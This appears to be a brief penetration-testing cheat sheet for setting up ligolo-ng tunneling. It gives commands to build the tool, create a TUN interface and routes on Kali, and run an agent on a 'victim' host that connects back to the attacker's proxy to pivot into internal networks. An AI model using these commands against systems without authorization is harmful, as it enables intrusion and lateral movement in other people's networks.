# LIGOLO

## Install

```bash
cd /opt
sudo git clone https://github.com/nicocha30/ligolo-ng
cd ligolo-ng
sudo go build -o agent cmd/agent/main.go
sudo go build -o proxy cmd/proxy/main.go
```

## Creating a TUN Interface (kali)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

## Starting the Proxy Server (kali)

```bash
cd /opt/ligolo-ng
./proxy -selfcert
```

## Agent (victim)

https://github.com/nicocha30/ligolo-ng/releases

```bash
./agent -connect kali_ip:11601 -ignore-cert
```

## Adding a new route on Proxy Server (kali)

```bash
sudo ip route add ip_to_reach_on_victim/24 dev ligolo
```

## Start session (kali/proxy)

- Type `session`
- Select the session
- Type `start`
